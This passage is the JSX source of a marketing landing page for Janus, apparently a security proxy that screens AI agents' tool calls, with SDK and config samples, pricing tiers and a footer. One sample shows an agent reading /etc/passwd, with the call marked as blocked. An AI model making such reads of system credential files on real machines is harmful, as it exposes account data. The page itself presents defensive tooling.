                  <span className="text-[#60a5fa]">await</span>{" "}
                  <span className="text-[#e4e7ef]">guardian.wrap_tool_call</span>
                  <span className="text-[#636880]">(</span>
                </div>
                <div className="pl-4">
                  <span className="text-[#e4e7ef]">session_id</span>
                  <span className="text-[#636880]">=</span>
                  <span className="text-[#5eead4]">&quot;sess-1&quot;</span>
                  <span className="text-[#636880]">,</span>
                </div>
                <div className="pl-4">
                  <span className="text-[#e4e7ef]">tool_name</span>
                  <span className="text-[#636880]">=</span>
                  <span className="text-[#5eead4]">&quot;execute_sql&quot;</span>
                  <span className="text-[#636880]">,</span>
                </div>
                <div className="pl-4">
                  <span className="text-[#e4e7ef]">tool_input</span>
                  <span className="text-[#636880]">=</span>
                  <span className="text-[#636880]">{"{"}</span>
                  <span className="text-[#5eead4]">&quot;query&quot;</span>
                  <span className="text-[#636880]">:</span>{" "}
                  <span className="text-[#5eead4]">&quot;...&quot;</span>
                  <span className="text-[#636880]">{"}"}</span>
                </div>
                <div>
                  <span className="text-[#636880]">)</span>
                </div>

                <div className="mt-4 text-[#4a4e63]"># 3. Act on the verdict</div>
                <div>
                  <span className="text-[#60a5fa]">if</span>{" "}
                  <span className="text-[#e4e7ef]">verdict.action</span>{" "}
                  <span className="text-[#636880]">==</span>{" "}
                  <span className="text-[#5eead4]">&quot;block&quot;</span>
                  <span className="text-[#636880]">:</span>
                </div>
                <div className="pl-4">
                  <span className="text-[#60a5fa]">raise</span>{" "}
                  <span className="text-[#e4e7ef]">SecurityError</span>
                  <span className="text-[#636880]">(</span>
                  <span className="text-[#e4e7ef]">verdict.reason</span>
                  <span className="text-[#636880]">)</span>
                </div>
              </div>
            </div>

            {/* TOML Config */}
            <div className="rounded-xl border border-[#1e2233] bg-[#0a0c13] overflow-hidden">
              <div className="flex items-center justify-between border-b border-[#1e2233] px-5 py-3">
                <div className="flex items-center gap-2">
                  <Settings size={13} className="text-[#a78bfa]" />
                  <span className="text-[12px] font-bold text-[#e4e7ef]">Configuration</span>
                </div>
                <span className="rounded-full bg-[#a78bfa]/10 px-2 py-0.5 text-[10px] font-bold text-[#a78bfa]">
                  janus.toml
                </span>
              </div>
              <div
                className="p-5 text-[13px] leading-[1.9]"
                style={{ fontFamily: "var(--font-mono)" }}
              >
                <div className="text-[#4a4e63]"># Risk thresholds</div>
                <div>
                  <span className="text-[#60a5fa]">[risk]</span>
                </div>
                <div>
                  <span className="text-[#e4e7ef]">lock_threshold</span>{" "}
                  <span className="text-[#636880]">=</span>{" "}
                  <span className="text-[#fbbf24]">80.0</span>
                </div>
                <div>
                  <span className="text-[#e4e7ef]">sandbox_threshold</span>{" "}
                  <span className="text-[#636880]">=</span>{" "}
                  <span className="text-[#fbbf24]">50.0</span>
                </div>

                <div className="mt-4 text-[#4a4e63]"># Agent permissions</div>
                <div>
                  <span className="text-[#60a5fa]">[permissions.default]</span>
                </div>
                <div>
                  <span className="text-[#e4e7ef]">allow</span>{" "}
                  <span className="text-[#636880]">=</span>{" "}
                  <span className="text-[#636880]">[</span>
                  <span className="text-[#5eead4]">&quot;read_*&quot;</span>
                  <span className="text-[#636880]">,</span>{" "}
                  <span className="text-[#5eead4]">&quot;search_*&quot;</span>
                  <span className="text-[#636880]">]</span>
                </div>
                <div>
                  <span className="text-[#e4e7ef]">deny</span>{" "}
                  <span className="text-[#636880]">=</span>{" "}
                  <span className="text-[#636880]">[</span>
                  <span className="text-[#5eead4]">&quot;execute_*&quot;</span>
                  <span className="text-[#636880]">,</span>{" "}
                  <span className="text-[#5eead4]">&quot;write_*&quot;</span>
                  <span className="text-[#636880]">]</span>
                </div>

                <div className="mt-4 text-[#4a4e63]"># Alert on blocks</div>
                <div>
                  <span className="text-[#60a5fa]">[exporters.notifications.slack]</span>
                </div>
                <div>
                  <span className="text-[#e4e7ef]">webhook_url</span>{" "}
                  <span className="text-[#636880]">=</span>{" "}
                  <span className="text-[#5eead4]">&quot;https://hooks.slack.com/...&quot;</span>
                </div>
                <div>
                  <span className="text-[#e4e7ef]">min_verdict</span>{" "}
                  <span className="text-[#636880]">=</span>{" "}
                  <span className="text-[#5eead4]">&quot;block&quot;</span>
                </div>
              </div>
            </div>
          </div>

          {/* Feature highlights */}
          <div className="mt-12 grid gap-4 sm:grid-cols-2 lg:grid-cols-4">
            {[
              { icon: Layers, label: "Multi-model", desc: "Anthropic, OpenAI, or Ollama", color: "#5eead4" },
              { icon: BookOpen, label: "Audit export", desc: "CSV, JSON, JSONL formats", color: "#a78bfa" },
              { icon: Zap, label: "Real-time alerts", desc: "Slack, email, Telegram", color: "#fbbf24" },
              { icon: Activity, label: "Session replay", desc: "Full forensic trace", color: "#60a5fa" },
            ].map((feat) => (
              <div
                key={feat.label}
                className="flex items-center gap-3 rounded-xl border border-[#1e2233] bg-[#0a0c13] p-4 transition-all hover:bg-[#0e1018]"
              >
                <div
                  className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg"
                  style={{ backgroundColor: `${feat.color}10` }}
                >
                  <feat.icon size={15} style={{ color: feat.color }} />
                </div>
                <div>
                  <div className="text-[13px] font-bold text-[#e4e7ef]">{feat.label}</div>
                  <div className="text-[11px] text-[#4a4e63]">{feat.desc}</div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ══════════════════════════════════════════════════════════
          INTEGRATION
          ══════════════════════════════════════════════════════════ */}
      <section
        id="integration"
        ref={revealIntegration.ref}
        className={`reveal-section ${revealIntegration.visible ? "visible" : ""} relative py-24 sm:py-28 border-t border-[#1e2233]/40`}
      >
        <div className="mx-auto max-w-6xl px-6">
          <div className="mb-14 max-w-2xl">
            <span className="mb-4 inline-block rounded-full border border-[#1e2233] bg-[#0e1018] px-3 py-1 text-[11px] font-bold uppercase tracking-widest text-[#60a5fa]">
              Integration
            </span>
            <h2
              className="text-3xl tracking-tight sm:text-4xl"
              style={{ fontFamily: "var(--font-serif)" }}
            >
              Three lines of code.
              <br />
              <span className="text-[#636880]">Or zero, with MCP.</span>
            </h2>
          </div>

          <div className="grid gap-5 lg:grid-cols-2">
            {/* Python SDK */}
            <div className="rounded-xl border border-[#1e2233] bg-[#0a0c13] overflow-hidden">
              <div className="flex items-center justify-between border-b border-[#1e2233] px-5 py-3">
                <div className="flex items-center gap-2">
                  <Terminal size={13} className="text-[#5eead4]" />
                  <span className="text-[12px] font-bold text-[#e4e7ef]">Python SDK</span>
                </div>
                <span className="rounded-full bg-[#5eead4]/10 px-2 py-0.5 text-[10px] font-bold text-[#5eead4]">
                  3 lines
                </span>
              </div>
              <div
                className="p-5 text-[13px] leading-[1.8]"
                style={{ fontFamily: "var(--font-mono)" }}
              >
                <div>
                  <span className="text-[#60a5fa]">from</span>{" "}
                  <span className="text-[#e4e7ef]">janus</span>{" "}
                  <span className="text-[#60a5fa]">import</span>{" "}
                  <span className="text-[#e4e7ef]">Guardian</span>
                </div>
                <div className="mt-3 text-[#4a4e63]"># Wrap every tool call</div>
                <div>
                  <span className="text-[#e4e7ef]">verdict</span>{" "}
                  <span className="text-[#636880]">=</span>{" "}
                  <span className="text-[#60a5fa]">await</span>{" "}
                  <span className="text-[#e4e7ef]">guardian</span>
                  <span className="text-[#636880]">.</span>
                  <span className="text-[#e4e7ef]">wrap_tool_call</span>
                  <span className="text-[#636880]">(</span>
                </div>
                <div className="pl-6">
                  <span className="text-[#e4e7ef]">tool_name</span>
                  <span className="text-[#636880]">=</span>
                  <span className="text-[#5eead4]">&quot;read_file&quot;</span>
                  <span className="text-[#636880]">,</span>
                </div>
                <div className="pl-6">
                  <span className="text-[#e4e7ef]">tool_input</span>
                  <span className="text-[#636880]">=</span>
                  <span className="text-[#636880]">{"{"}</span>
                  <span className="text-[#e4e7ef]">path</span>
                  <span className="text-[#636880]">:</span>{" "}
                  <span className="text-[#5eead4]">&quot;/etc/passwd&quot;</span>
                  <span className="text-[#636880]">{"}"}</span>
                </div>
                <div>
                  <span className="text-[#636880]">)</span>
                </div>
                <div className="mt-3 text-[#4a4e63]">
                  # =&gt; BLOCKED: path traversal detected
                </div>
              </div>
            </div>

            {/* MCP Proxy */}
            <div className="rounded-xl border border-[#1e2233] bg-[#0a0c13] overflow-hidden">
              <div className="flex items-center justify-between border-b border-[#1e2233] px-5 py-3">
                <div className="flex items-center gap-2">
                  <Globe size={13} className="text-[#a78bfa]" />
                  <span className="text-[12px] font-bold text-[#e4e7ef]">MCP Proxy</span>
                </div>
                <span className="rounded-full bg-[#a78bfa]/10 px-2 py-0.5 text-[10px] font-bold text-[#a78bfa]">
                  zero code
                </span>
              </div>
              <div
                className="p-5 text-[13px] leading-[1.8]"
                style={{ fontFamily: "var(--font-mono)" }}
              >
                <div className="text-[#4a4e63]"># janus-proxy.toml</div>
                <div className="mt-2">
                  <span className="text-[#60a5fa]">[agent]</span>
                </div>
                <div>
                  <span className="text-[#e4e7ef]">agent_id</span>{" "}
                  <span className="text-[#636880]">=</span>{" "}
                  <span className="text-[#5eead4]">&quot;claude-desktop&quot;</span>
                </div>
                <div>
                  <span className="text-[#e4e7ef]">permissions</span>{" "}
                  <span className="text-[#636880]">=</span>{" "}
                  <span className="text-[#636880]">[</span>
                  <span className="text-[#5eead4]">&quot;read_*&quot;</span>
                  <span className="text-[#636880]">,</span>{" "}
                  <span className="text-[#5eead4]">&quot;search_*&quot;</span>
                  <span className="text-[#636880]">]</span>
                </div>
                <div className="mt-3">
                  <span className="text-[#60a5fa]">[[upstream_servers]]</span>
                </div>
                <div>
                  <span className="text-[#e4e7ef]">name</span>{" "}
                  <span className="text-[#636880]">=</span>{" "}
                  <span className="text-[#5eead4]">&quot;filesystem&quot;</span>
                </div>
                <div>
                  <span className="text-[#e4e7ef]">command</span>{" "}
                  <span className="text-[#636880]">=</span>{" "}
                  <span className="text-[#5eead4]">&quot;npx @modelcontextprotocol/server-filesystem&quot;</span>
                </div>
                <div className="mt-3 text-[#4a4e63]">
                  # All tool calls now pass through Janus
                </div>
              </div>
            </div>
          </div>

          {/* Framework badges */}
          <div className="mt-10 flex flex-wrap items-center justify-center gap-3">
            {[
              { name: "MCP Protocol", color: "#5eead4" },
              { name: "LangChain", color: "#60a5fa" },
              { name: "OpenAI SDK", color: "#e4e7ef" },
              { name: "CrewAI", color: "#f87171" },
              { name: "AutoGen", color: "#a78bfa" },
            ].map((fw) => (
              <div
                key={fw.name}
                className="flex items-center gap-2 rounded-full border border-[#1e2233] bg-[#0e1018] px-3.5 py-1.5"
              >
                <div className="h-[6px] w-[6px] rounded-full" style={{ backgroundColor: fw.color }} />
                <span className="text-[12px] font-medium text-[#636880]">{fw.name}</span>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ══════════════════════════════════════════════════════════
          PRICING
          ══════════════════════════════════════════════════════════ */}
      <section
        id="pricing"
        ref={revealPricing.ref}
        className={`reveal-section ${revealPricing.visible ? "visible" : ""} relative py-24 sm:py-28 border-t border-[#1e2233]/40`}
      >
        <div className="mx-auto max-w-6xl px-6">
          <div className="mb-14 text-center">
            <span className="mb-4 inline-block rounded-full border border-[#1e2233] bg-[#0e1018] px-3 py-1 text-[11px] font-bold uppercase tracking-widest text-[#a78bfa]">
              Pricing
            </span>
            <h2
              className="text-3xl tracking-tight sm:text-4xl"
              style={{ fontFamily: "var(--font-serif)" }}
            >
              Start free.{" "}
              <span className="text-[#636880]">Scale when you&apos;re ready.</span>
            </h2>
          </div>

          <div className="grid gap-5 lg:grid-cols-3">
            {/* Free */}
            <div className="rounded-2xl border border-[#1e2233] bg-[#0a0c13] p-7 transition-all hover:border-[#5eead4]/20">
              <h3 className="text-[15px] font-bold">Free</h3>
              <div className="mt-3 flex items-baseline gap-1">
                <span
                  className="text-4xl font-bold"
                  style={{ fontFamily: "var(--font-serif)" }}
                >
                  $0
                </span>
                <span className="text-[13px] text-[#4a4e63]">forever</span>
              </div>
              <p className="mt-3 text-[13px] text-[#636880] leading-relaxed">
                Open source SDK for developers building with AI agents.
              </p>

              <ul className="mt-6 space-y-2.5">
                {[
                  "Rule-based security pipeline",
                  "MCP proxy mode",
                  "6 threat patterns",
                  "Proof chain audit trail",
                  "Circuit breaker",
                  "Community support",
                ].map((f) => (
                  <li key={f} className="flex items-start gap-2 text-[13px] text-[#636880]">
                    <Check size={14} className="mt-0.5 shrink-0 text-[#5eead4]" />
                    {f}
                  </li>
                ))}
              </ul>

              <a
                href="https://github.com/AustinRyan/project-sentinel"
                target="_blank"
                rel="noopener noreferrer"
                className="mt-7 flex w-full items-center justify-center gap-2 rounded-xl border border-[#1e2233] bg-[#0e1018] px-4 py-3 text-[13px] font-bold text-[#e4e7ef] transition-all hover:border-[#5eead4]/30"
              >
                Install from GitHub
                <ExternalLink size={13} />
              </a>
            </div>

            {/* Team — animated gradient border */}
            <div className="relative">
              <div className="gradient-border-animated absolute inset-0 rounded-2xl" />
              <div className="relative m-[1px] rounded-2xl bg-[#0a0c13] p-7">
                <div className="mb-4 inline-block rounded-full bg-[#a78bfa]/10 px-3 py-0.5 text-[10px] font-bold text-[#a78bfa]">
                  Most Popular
                </div>
                <h3 className="text-[15px] font-bold">Team</h3>
                <div className="mt-3 flex items-baseline gap-1">
                  <span
                    className="text-4xl font-bold"
                    style={{ fontFamily: "var(--font-serif)" }}
                  >
                    $499
                  </span>
                  <span className="text-[13px] text-[#4a4e63]">/month</span>
                </div>
                <p className="mt-3 text-[13px] text-[#636880] leading-relaxed">
                  Advanced threat detection for teams running agents in production.
                </p>

                <ul className="mt-6 space-y-2.5">
                  {[
                    "Everything in Free",
                    "LLM intent classifier",
                    "Drift detection",
                    "Taint tracking",
                    "Predictive risk scoring",
                    "Cloud dashboard",
                    "Up to 10 agents",
                    "Email support (48h SLA)",
                  ].map((f) => (
                    <li key={f} className="flex items-start gap-2 text-[13px] text-[#636880]">
                      <Check size={14} className="mt-0.5 shrink-0 text-[#a78bfa]" />
                      {f}
                    </li>
                  ))}
                </ul>

                <button
                  onClick={handleStartTrial}
                  disabled={checkoutLoading}
                  className="mt-7 flex w-full items-center justify-center gap-2 rounded-xl bg-[#a78bfa] px-4 py-3 text-[13px] font-bold text-white transition-all hover:bg-[#8b5cf6] hover:shadow-[0_0_20px_#a78bfa30] disabled:opacity-60 disabled:cursor-not-allowed"
                >
                  {checkoutLoading ? (
                    <>
                      <span className="inline-block h-3.5 w-3.5 animate-spin rounded-full border-2 border-white/30 border-t-white" />
                      Creating checkout…
                    </>
                  ) : (
                    <>
                      Start Free Trial
                      <ArrowRight size={13} />
                    </>
                  )}
                </button>
              </div>
            </div>

            {/* Enterprise */}
            <div className="rounded-2xl border border-[#1e2233] bg-[#0a0c13] p-7 transition-all hover:border-[#60a5fa]/20">
              <h3 className="text-[15px] font-bold">Enterprise</h3>
              <div className="mt-3 flex items-baseline gap-1">
                <span
                  className="text-4xl font-bold"
                  style={{ fontFamily: "var(--font-serif)" }}
                >
                  Custom
                </span>
              </div>
              <p className="mt-3 text-[13px] text-[#636880] leading-relaxed">
                Full platform for organizations with compliance requirements.
              </p>

              <ul className="mt-6 space-y-2.5">
                {[
                  "Everything in Team",
                  "Crowd-sourced threat intel",
                  "Unlimited agents",
                  "SSO / SAML",
                  "Compliance reports",
                  "Webhook integrations",
                  "Dedicated support + SLA",
                  "Custom deployment",
                ].map((f) => (
                  <li key={f} className="flex items-start gap-2 text-[13px] text-[#636880]">
                    <Check size={14} className="mt-0.5 shrink-0 text-[#60a5fa]" />
                    {f}
                  </li>
                ))}
              </ul>

              <a
                href="mailto:sales@janus-security.ai"
                className="mt-7 flex w-full items-center justify-center gap-2 rounded-xl border border-[#60a5fa]/30 bg-[#60a5fa]/[0.06] px-4 py-3 text-[13px] font-bold text-[#60a5fa] transition-all hover:border-[#60a5fa]/50 hover:bg-[#60a5fa]/10"
              >
                Contact Sales
                <ArrowRight size={13} />
              </a>
            </div>
          </div>
        </div>
      </section>

      {/* ══════════════════════════════════════════════════════════
          CTA
          ══════════════════════════════════════════════════════════ */}
      <section className="relative py-24 sm:py-28 border-t border-[#1e2233]/40">
        <div className="pointer-events-none absolute inset-0 bg-[radial-gradient(ellipse_at_center,rgba(94,234,212,0.04)_0%,transparent_50%)]" />

        <div className="relative z-10 mx-auto max-w-2xl px-6 text-center">
          <h2
            className="text-3xl tracking-tight sm:text-4xl"
            style={{ fontFamily: "var(--font-serif)" }}
          >
            Your agents are running.
            <br />
            <em className="text-[#5eead4]">Are they running safe?</em>
          </h2>

          <div className="mt-10 inline-flex items-center gap-3 rounded-xl border border-[#1e2233] bg-[#0a0c13] px-5 py-3">
            <span
              className="text-[13px] text-[#4a4e63]"
              style={{ fontFamily: "var(--font-mono)" }}
            >
              $
            </span>
            <span
              className="text-[13px] text-[#5eead4]"
              style={{ fontFamily: "var(--font-mono)" }}
            >
              pip install janus-security
            </span>
            <button
              onClick={handleCopy}
              className="ml-2 rounded-md bg-[#161923] p-1.5 text-[#636880] transition-colors hover:text-[#e4e7ef]"
              aria-label="Copy"
            >
              {copied ? <Check size={13} className="text-[#5eead4]" /> : <Copy size={13} />}
            </button>
          </div>

          <div className="mt-8 flex flex-wrap justify-center gap-4">
            <a
              href="https://github.com/AustinRyan/project-sentinel"
              target="_blank"
              rel="noopener noreferrer"
              className="group inline-flex items-center gap-2 rounded-xl bg-[#5eead4] px-7 py-3.5 text-[14px] font-bold text-[#06080e] transition-all hover:bg-[#2dd4bf] hover:shadow-[0_0_28px_#5eead430]"
            >
              Get Started Free
              <ArrowRight
                size={15}
                className="transition-transform group-hover:translate-x-0.5"
              />
            </a>
            <a
              href="#pricing"
              className="inline-flex items-center gap-2 rounded-xl border border-[#1e2233] bg-[#0e1018] px-7 py-3.5 text-[14px] font-bold text-[#e4e7ef] transition-all hover:border-[#5eead4]/30"
            >
              View Pricing
            </a>
          </div>
        </div>
      </section>

      {/* ══════════════════════════════════════════════════════════
          FOOTER
          ══════════════════════════════════════════════════════════ */}
      <footer className="border-t border-[#1e2233]/40 bg-[#080a11]">
        <div className="mx-auto max-w-6xl px-6 py-12">
          <div className="grid gap-8 sm:grid-cols-2 lg:grid-cols-4">
            <div>
              <div className="mb-4 flex items-center gap-2">
                <Shield size={15} className="text-[#5eead4]" />
                <span className="text-[14px] font-semibold">Janus</span>
              </div>
              <p className="text-[12px] text-[#4a4e63] leading-relaxed">
                Autonomous security layer for AI agents. Every tool call passes through Janus.
              </p>
            </div>

            <div>
              <h4 className="mb-4 text-[11px] font-bold uppercase tracking-widest text-[#636880]">
                Product
              </h4>
              <ul className="space-y-2">
                {["Pipeline", "Docs", "Integration", "Pricing"].map((l) => (
                  <li key={l}>
                    <a href={`#${l.toLowerCase()}`} className="text-[12px] text-[#4a4e63] transition-colors hover:text-[#e4e7ef]">
                      {l}
                    </a>
                  </li>
                ))}
              </ul>
            </div>

            <div>
              <h4 className="mb-4 text-[11px] font-bold uppercase tracking-widest text-[#636880]">
                Resources
              </h4>
              <ul className="space-y-2">
                {["GitHub", "API Reference", "Changelog", "Status"].map((l) => (
                  <li key={l}>
                    <a href="#" className="text-[12px] text-[#4a4e63] transition-colors hover:text-[#e4e7ef]">
                      {l}
                    </a>
                  </li>
                ))}
              </ul>
            </div>

            <div>
              <h4 className="mb-4 text-[11px] font-bold uppercase tracking-widest text-[#636880]">
                Company
              </h4>
              <ul className="space-y-2">
                {["About", "Contact", "Privacy", "Terms"].map((l) => (
                  <li key={l}>
                    <a href="#" className="text-[12px] text-[#4a4e63] transition-colors hover:text-[#e4e7ef]">
                      {l}
                    </a>
                  </li>
                ))}
              </ul>
            </div>
          </div>

          <div className="mt-10 flex flex-col items-center justify-between gap-4 border-t border-[#1e2233]/40 pt-8 sm:flex-row">
            <p className="text-[11px] text-[#4a4e63]">
              &copy; 2026 Janus Security. BSL-1.1 License.
            </p>
            <div className="flex items-center gap-1.5 text-[11px] text-[#4a4e63]">
              <div className="h-1.5 w-1.5 rounded-full bg-[#5eead4] animate-pulse" />
              All systems operational
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
